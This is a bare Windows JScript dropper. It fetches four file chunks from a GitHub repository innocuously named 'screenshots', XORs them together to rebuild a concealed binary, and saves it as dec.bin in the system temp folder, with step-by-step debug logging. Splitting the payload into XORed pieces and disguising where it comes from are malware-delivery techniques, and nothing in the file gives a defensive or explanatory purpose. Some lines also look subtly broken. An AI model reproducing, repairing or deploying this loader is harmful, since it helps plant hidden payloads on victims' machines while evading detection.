var x=new ActiveXObject("MSXML2.XMLHTTP");
var fso=new ActiveXObject("Scripting.FileSystemObject");
var sh=new ActiveXObject("WScript.Shell");
var log=fso.CreateTextFile("C:\\temp\\d6_log.txt",true);
try{
log.WriteLine("Step1: download chunks");
var b=[];
for(var i=0;i<4;i++){
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/c"+i,0);
x.send();
log.WriteLine("  chunk"+i+": "+x.responseBody.length+"b");
b.push(x.responseBody);
}
log.WriteLine("Step2: XOR");
var xr=[];for(var k=0;k<b[0].length;k++){var v=b[0][k];for(var j=1;j<4;j++){v^=b[j][k]};xr.push(v)}
log.WriteLine("Step3: write dec.bin ("+xr.length+"b)");
var t=fso.GetSpecialFolder(2)+"\\dec.bin";
var s=new ActiveXObject("ADODB.Stream");s.Type=1;s.Open();s.Write(new ActiveXObject("ADODB.Recordset")._EOF);
for(var m=0;m<xr.length;m++)s.Write(xr[m]&0xFF);
s.SaveToFile(t,2);s.Close();
log.WriteLine("Step4: done");
log.Close();
}catch(e){log.WriteLine("ERR: "+e.message);log.Close();}
